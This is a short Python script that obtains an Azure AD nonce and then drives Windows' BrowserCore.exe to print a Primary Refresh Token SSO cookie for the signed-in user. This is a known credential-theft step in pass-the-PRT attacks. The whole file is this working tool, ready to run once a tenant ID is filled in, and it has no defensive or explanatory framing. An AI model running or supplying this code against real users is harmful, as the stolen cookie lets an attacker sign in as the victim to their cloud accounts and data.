"""
    Request PRT cookie using BrowserCore.exe
"""
import requests
import subprocess
import struct
import json


def get_nonce(tenant_id):
    url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
    body = {
        "grant_type": "srv_challenge"
    }
    response = requests.post(url, data=body)

    if response.status_code == 200:
        result = response.json()
        nonce = result.get("Nonce")
        print(nonce)
        return nonce
    else:
        print(f"Request failed with status {response.status_code}: {response.text}")

    return None


def get_prt_cookie(nonce):
    process = subprocess.Popen([r"C:\Windows\BrowserCore\browsercore.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    inv = {}
    inv['method'] = 'GetCookies'
    inv['sender'] = "https://login.microsoftonline.com"
    inv['uri'] = f'https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce={nonce}'
    text = json.dumps(inv).encode('utf-8')
    encoded_length = struct.pack('=I', len(text))
    print(process.communicate(input=encoded_length + text)[0])


if __name__ == "__main__":
    # Set manually
    tenant_id = ''

    nonce = get_nonce(tenant_id)
    if nonce:
        get_prt_cookie(nonce)
